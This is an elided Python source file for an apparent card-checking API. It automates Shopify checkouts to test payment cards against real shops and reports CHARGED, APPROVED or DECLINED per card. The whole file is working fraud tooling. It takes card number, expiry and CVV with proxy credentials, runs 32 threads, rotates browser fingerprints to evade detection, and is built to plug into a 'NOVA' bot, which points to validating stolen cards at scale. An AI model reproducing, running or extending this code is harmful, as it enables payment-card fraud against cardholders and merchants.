"""
Shopify Checkout API — NOVA Bot Compatible
Contract: GET /check?url=<shop>&card=NUM|MM|YYYY|CVV&proxy=ip:port:user:pass
Returns:  {"Response":"CHARGED|APPROVED|DECLINED|ERROR", "Charged":"True|False",
           "Price":"...", "Gateway":"Shopify", "Site":"...", "status_code":"...",
           "error":"...", "retryable":bool, "receipt_url":"..."}

CHARGED is returned ONLY when Shopify confirms a REAL order:
    - SuccessfulReceipt WITH a /orders/ confirmation URL or order GID
    - OR ProcessedReceipt WITH a /orders/ confirmation URL or order GID

ProcessedReceipt WITHOUT a real order URL is treated as APPROVED
(payment submitted but not captured) — NOT as CHARGED.
"""
...
# ─────────────────────────── config ─────────────────────────────────────
THREADS = int(os.environ.get("CHECKER_THREADS", "32"))
RETRIES = int(os.environ.get("CHECKER_RETRIES", "1"))

BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "edge101", "safari17_0"]
USER_AGENTS = [
...
_R = {
    ...
    "actions":     re.compile(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)'),
    ...
    # Order-confirmation signals — used to verify a REAL charge
    "order_conf_url": re.compile(r'"confirmationPage"\s*:\s*\{[^}]*?"url"\s*:\s*"([^"]+)"'),
    "order_status_url": re.compile(r'"orderStatusPageUrl"\s*:\s*"([^"]+)"'),
    "order_gid":   re.compile(r'"order"\s*:\s*\{[^}]*?"id"\s*:\s*"(gid://shopify/Order/\d+)"'),
    "order_gid_alt": re.compile(r'"orderId"\s*:\s*"(gid://shopify/Order/\d+)"'),
}
...
FALLBACK_ORDER = ["CA","GB","AU","DE","FR","NL","IE"]
...
class TLS:
    ...
    def get(self, u, **k): k.setdefault("timeout", 20); return self.s.get(u, **k)
    def post(self, u, **k): k.setdefault("timeout", 20); return self.s.post(u, **k)
    def close(self):
        try: self.s.close()
        except: pass
...
def cart_to_checkout(client: TLS, shop: str, variant: str) -> Tuple[str, str, str, str]:
    ...
    m = _R["session"].search(html_body)
    ses_tok = html.unescape(m.group(1)).strip('"') if m else ""
    return url, ck_tok, ses_tok, html_body
...
def fetch_ids(client: TLS, shop: str, checkout_html: str) -> Tuple[str, str, str]:
    ...
    if not url: raise Exception("no actions js")
    r = client.get(shop + url, headers={"Referer": checkout_html[:80]})
    if r.status_code != 200: raise Exception(f"actions js HTTP {r.status_code}")
    js = r.text
    ...
    if not prop or not subm: raise Exception("missing ids")
...
def is_digital_flow(body: str) -> bool:
    try: return _seller(body).get("isShippingRequired") is False
    except: return False
...
def any_error(body: str) -> str:
    for rx in ("err_nonloc", "err_loc", "err_code", "err_msg"):
        m = _R[rx].search(body)
        if m: return map_err(m.group(1))
    return ""

# ─────────────────────────── REAL-ORDER VERIFIER ────────────────────────
def is_real_charge(poll_body: str) -> Tuple[bool, str]:
    """
    Return (is_real_order, receipt_url).

    A charge is REAL only when we have a genuine order URL or Order GID.
    Shopify's ProcessedReceipt alone is NOT proof of charge — it can still
    flip to FailedReceipt on the next poll. Only trust:
      • confirmationPage.url containing /orders/
      • orderStatusPageUrl containing /orders/
      • order.id / orderId matching gid://shopify/Order/<digits>
    """
    try:
    ...
    # 1) confirmationPage.url — must be a real order URL
    conf_url = ""
    ...
    if conf_url:
        if "/orders/" in conf_url:
            return True, conf_url
        # Some stores return relative paths like "/orders/12345/thank_you"
        if conf_url.startswith("/orders/") or "/orders/" in conf_url:
            shop_root = conf_url.split("/orders/")[0]
            return True, conf_url

    # 2) orderStatusPageUrl — must contain /orders/
    osp = receipt.get("orderStatusPageUrl") or ""
    if osp and "/orders/" in osp:
        return True, osp

    # 3) order GID present in JSON
    ...
    if isinstance(order_gid, str) and order_gid.startswith("gid://shopify/Order/"):
        # Construct a user-friendly URL — fallback to /orders
        return True, ""
...
def run_checkout(shop: str, card_entry: str, proxy: str = "", low: bool = True) -> CheckResult:
    ...
    try:
        ...
        if len(p) != 4: raise ValueError("expected NUM|MM|YYYY|CVV")
    ...
    try:
        ...
        try:
            ...
            result.retryable = True; result.error = f"Step0: {e}"; return result

        try:
            ck_url, ck_tok, ses_tok, html_body = cart_to_checkout(client, shop, variant)
        except Exception as e:
            result.retryable = True; result.error = f"Step1: {e}"; return result
        ...
        if not (stable and build and ses_tok):
            result.retryable = True; result.error = "Step1: missing tokens"; return result

        if pat:
            try: fetch_pat(client, shop, ck_url, pat)
            except: pass

        try:
            prop_id, submit_id, poll_id = fetch_ids(client, shop, ck_url)
        except Exception as e:
            result.retryable = True; result.error = f"Step3: {e}"; return result
        ...
        try:
            ...
            cur = _g("cur", resp) or cur; ctry = _g("ctry", resp) or ctry
            result.currency = cur
            qt = _g("queue", resp)
            if not qt: raise Exception("no queue")
        except Exception as e:
            result.retryable = True; result.error = f"Step4: {e}"; return result
        ...
        try:
            ...
            resp = send_proposal(client, shop, ck_url, ck_tok, ses_tok, build, src, prop_id, body)
            qt2 = _g("queue", resp)
            if not qt2: raise Exception("no queue")
        except Exception as e:
            result.retryable = True; result.error = f"Step5: {e}"; return result

        # Step 6 — proposal 3 with country fallback
        addr = pick_addr(ctry)
        fallbacks = fallback_addrs(addr.country)
        final_body = None; qt3 = None
        for attempt in range(1 + len(fallbacks)):
            body = _proposal_body(ses_tok, stable, variant, qt2, email, addr, cur, ctry)
            resp = send_proposal(client, shop, ck_url, ck_tok, ses_tok, build, src, prop_id, body)
            _qt = _g("queue", resp)
            if not _qt: raise Exception("no queue")
            low_r = resp.lower()
            ...
            if not shipping_blocked or attempt >= len(fallbacks):
                final_body = resp; qt3 = _qt; break
            addr = fallbacks[attempt]; qt2 = _qt

        if not final_body:
            result.retryable = True; result.error = "Step6: no shipping"; return result
        ...
        try:
            ...
            qt4 = _g("queue", resp4)
            if not qt4: raise Exception("no queue")
        except Exception as e:
            result.retryable = True; result.error = f"Step7: {e}"; return result
        ...
        try:
            ...
            result.retryable = True; result.error = f"Step8: {e}"; return result
        ...
        if not total:
            result.retryable = True; result.error = "no total"; return result

        # Step 9 — PCI vault
        try:
            pci_id = vault_card(ident, card_num, f"{addr.first} {addr.last}", mes, ano, cvv,
                                vdom or shop, vault, proxy, profile)
            if not pci_id: raise Exception("no pci id")
        except Exception as e:
            result.retryable = True; result.error = f"Step9: {e}"; return result
        ...
        try:
            ...
            result.retryable = True; result.error = f"Step10: {e}"; return result
        ...
        if not receipt_ses:
            result.retryable = True; result.error = "no receipt session"; return result

        # Step 11 — poll for receipt, with STRICT real-order verification
        for poll_num in range(1, 21):
            try:
                ...
                # ── Real charge verification ──
                if rtype in ("ProcessedReceipt", "SuccessfulReceipt"):
                    real_order, real_url = is_real_charge(pr)

                    if real_order:
                        # Only NOW do we declare CHARGED
                        result.status = CheckStatus.CHARGED
                        result.status_code = "ORDER_PLACED"
                        result.amount = total
                        # If no explicit URL was found but GID matched, construct one
                        if not real_url:
                            clean_shop = shop.rstrip("/")
                            real_url = f"{clean_shop}/orders"
                        result.receipt_url = real_url
                        return result

                    # ProcessedReceipt without real order URL — NOT a charge.
                    # Treat as APPROVED (payment submitted, not captured).
                    # Continue polling in case a real receipt arrives next.
                    if rtype == "SuccessfulReceipt":
                        # SuccessfulReceipt without URL is suspicious — 
                        # still accept it as APPROVED, not CHARGED.
                        result.status = CheckStatus.APPROVED
                        result.status_code = "PAYMENT_PROCESSING"
                        result.amount = total
                        result.receipt_url = ""
                        return result
                    # ProcessedReceipt — keep polling (may upgrade to SuccessfulReceipt)
                    # but cap it so we don't loop forever.
                    if poll_num >= 15:
                        result.status = CheckStatus.APPROVED
                        result.status_code = "PAYMENT_PROCESSING"
                        result.amount = total
...
app = FastAPI(title="Shopify Checkout API", version="2.1.0", docs_url=None, redoc_url=None)
...
class CheckResp(BaseModel):
    ...
    CC: str = ""
    Price: str = ""
    Gateway: str = "Shopify"          # ← renamed from "Gate" for bot compat
    Site: str = ""
    status_code: str = ""
    error: str = ""
    retryable: bool = False
...
async def _run(shop: str, card: str, proxy: str, low: bool) -> CheckResp:
    ...
    for attempt in range(1 + RETRIES):
        ...
        try:
            ...
            last = CheckResp(Response="ERROR", error=str(e), retryable=True)
            continue
        finally:
            with _lock: _active -= 1
...
<h1>Shopify Real-Charge API</h1>
<p>Returns <span class=ok>CHARGED</span> only when Shopify confirms a <b>real order</b> (with an order URL or Order GID).</p>
<p><span class=warn>ProcessedReceipt</span> without a real order URL is reported as <b>APPROVED / PAYMENT_PROCESSING</b> — not CHARGED.</p>
<div class=card><b>GET /health</b><pre>curl /health</pre></div>
<div class=card><b>GET /check</b><pre>curl "/check?url=shop.com&card=NUM|MM|YYYY|CVV&proxy=ip:port:user:pass"</pre></div>
...
async def root(): return HTMLResponse(_DOCS)

@app.get("/docs", include_in_schema=False)
async def docs(): return HTMLResponse(_DOCS)

@app.get("/health")
async def health():
    with _lock: a = _active
    return {"ok": True, "threads": THREADS, "retries": RETRIES, "active": a}
...
async def check_get(
    ...
    proxy: str = Query("", description="ip:port:user:pass or http://user:pass@host:port"),
    low:   str = Query("true"),
):
    if not card or "|" not in card:
        return CheckResp(Response="ERROR", status_code="CARD_INVALID", error="format NUM|MM|YYYY|CVV")
    if not url:
    ...
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return await _run(url.rstrip("/"), card.strip(), proxy.strip(), low.lower() in ("1", "true", "yes"))
